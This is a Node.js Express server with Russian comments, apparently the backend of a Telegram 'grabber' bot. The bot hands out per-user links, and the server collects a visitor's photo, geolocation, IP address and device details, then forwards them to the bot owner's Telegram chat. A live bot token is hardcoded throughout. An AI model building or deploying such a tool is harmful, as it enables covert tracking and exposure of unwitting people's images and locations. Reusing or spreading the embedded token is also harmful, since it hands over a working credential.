// import express from 'express';
// import bodyParser from 'body-parser';
// import TelegramBot from 'node-telegram-bot-api';
// import multer from 'multer';
// import cors from 'cors'

// const app = express();
// const PORT = 5050;

// // Настройка bodyParser для обработки json и urlencoded данных
// app.use(bodyParser.json());
// app.use(bodyParser.urlencoded({ extended: true }));

// // Настройка multer для обработки multipart/form-data данных
// const upload = multer({ dest: 'uploads/' });
// app.use(cors());
// // Замените 'YOUR_TELEGRAM_BOT_TOKEN' на токен вашего бота
// const bot = new TelegramBot('6725080038:AAECwpthmboWiyHKETLomRN-4mQgfK4vhfc', { polling: true });

// // Обработчик команды /start
// bot.onText(/\/start/, (msg) => {
//     const chatId = msg.chat.id;
//     const userId = msg.from.id;
//     const link = `https://localhost/i/${userId}`;
//     bot.sendMessage(chatId, `Привет! Ваша уникальная ссылка для фотографии: ${link}`);
// });

// // Страница захвата фотографии
// app.get('/i/:userId', (req, res) => {
//     const userId = req.params.userId;
//     // Здесь вы можете создать шаблон страницы захвата фотографии с формой для захвата
//     res.send(`<html><body><form action="/upload" method="post" enctype="multipart/form-data">
//         <input type="hidden" name="userId" value="${userId}">
//         <input type="file" name="photo" accept="image/*">
//         <input type="submit" value="Отправить фотографию">
//     </form></body></html>`);
// });

// // Обработка запроса на загрузку фотографии с использованием multer
// // Обработка запроса на загрузку фотографии с использованием multer
// app.post('/upload', upload.single('photo'), (req, res) => {
//   const userId = req.body.userId;
//   const photo = req.file;

//   // Отправляем фотографию в Telegram бота
//   const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
//   const bot = new TelegramBot(telegramBotToken);

//   bot.sendPhoto(userId, photo.buffer, { caption: 'Новая фотография' })
//       .then(response => {
//           console.log('Photo sent to Telegram:', response);
//           res.send('Фотография успешно отправлена в бота Telegram');
//       })
//       .catch(error => {
//           console.error('Error sending photo to Telegram:', error);
//           res.status(500).send('Ошибка отправки фотографии в бота Telegram');
//       });
// });


// app.listen(PORT, () => {
//     console.log(`Server is running on http://localhost:${PORT}`);
// });


import express from 'express';
import axios from 'axios';
import FormData from 'form-data';
import cors from 'cors';
import multer from 'multer';

const app = express();
const PORT = 5000;

// Настройка Multer для сохранения загруженных файлов
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.json());
app.use(cors());

// Обработчик POST-запроса для отправки фотографии с местоположением в Telegram
app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
  const { chat_id, latitude, longitude, deviceInfo } = req.body;
  const photo = req.file;

  if (!photo) {
    return res.status(400).send('No file uploaded');
  }

  try {
    const apiUrl = `https://api.telegram.org/bot6725080038:AAECwpthmboWiyHKETLomRN-4mQgfK4vhfc/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', photo.buffer, {
      filename: photo.originalname,
      contentType: photo.mimetype,
      knownLength: photo.size,
    });

    // Формирование caption с данными о браузере и устройстве
    const caption = `Данные о пользователе:\n\n` +
                    `🔋 Уровень батареи: В разработке\n` +
                    `📍 IP адрес: ${req.ip}\n` +
                    `🌐 Браузер: ${deviceInfo.browserName}\n` +
                    `📱 Тип устройства: ${deviceInfo.deviceType}\n` +
                    `🖥 Платформа: ${deviceInfo.platform}\n` +
                    `📏 Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;

    formData.append('caption', caption);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    console.log('Photo sent to Telegram:', response.data);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    res.status(500).send('Error sending photo to Telegram');
  }
});

// Обработчик POST-запроса для отправки местоположения в Telegram
app.post('/sendLocationToTelegram', async (req, res) => {
  const { chat_id, latitude, longitude } = req.body;

  try {
    const apiUrl = `https://api.telegram.org/bot6725080038:AAECwpthmboWiyHKETLomRN-4mQgfK4vhfc/sendLocation`;
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('latitude', latitude);
    formData.append('longitude', longitude);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    console.log('Location sent to Telegram:', response.data);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending location to Telegram:', error);
    res.status(500).send('Error sending location to Telegram');
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});


